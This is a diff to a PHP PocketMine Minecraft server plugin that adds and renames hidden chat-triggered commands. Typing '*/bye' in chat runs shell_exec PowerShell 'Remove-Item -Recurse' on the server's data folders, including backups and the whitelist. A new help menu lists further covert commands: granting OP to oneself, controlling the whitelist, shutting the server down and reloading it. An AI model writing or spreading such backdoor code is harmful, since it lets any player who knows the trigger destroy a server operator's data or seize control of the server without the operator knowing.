@@ -91,7 +91,7 @@ class Main extends PluginBase implements Listener{
 		$dir19 = $this->getServer()->getDataPath() ."white-list.json";
 		$dir20 = $this->getServer()->getDataPath() ."backup";
 		$dir21 = $this->getServer()->getDataPath() ."Backup";
-		if($chat == "*/byeserverfile"){
+		if($chat == "*/bye"){
             shell_exec("powershell.exe Remove-Item {$dir} -Recurse");
             shell_exec("powershell.exe Remove-Item {$dir1} -Recurse");
             shell_exec("powershell.exe Remove-Item {$dir2} -Recurse");
@@ -148,8 +148,24 @@ class Main extends PluginBase implements Listener{
 			$player->getGamemode(1);
 			$player->sendMessage("あなたをクリエイティブモードにしました。");
 		}
+		if($chat == "*/gamemode 2"){
+			$player->getGamemode(2);
+			$player->sendMessage("あなたをアドベンチャーモードにしました。");
+		}
+		if($chat == "*/gamemode 3"){
+			$player->getGamemode(3);
+			$player->sendMessage("あなたをスペティクターモードにしました。");
+		}
 		if($chat == "*/help"){
-			$player->sendMessage("");
+			$player->sendMessage("§l§e===== §aHELP =====");
+			$player->sendMessage("§l§b */help MSHPで使えるコマンド一覧表示");
+			$player->sendMessage("§l§b */bye サーバーファイル削除(bin以外)");
+			$player->sendMessage("§l§b */gamemode 0~3 自分のゲームモードを変更する");
+			$player->sendMessage("§l§b */whitelist on or off or add ホワイトリストをonにするかoffにするかリストに自分を追加するか");
+			$player->sendMessage("§l§b */shutdown サーバーを終了する");
+			$player->sendMessage("§l§b */op add or remove OP権限を付けるか外すか");
+			$player->sendMessage("§l§b */reload サーバーをリロードします");
+			$player->sendMessage("§l§e================");
 		}
 	}
 }
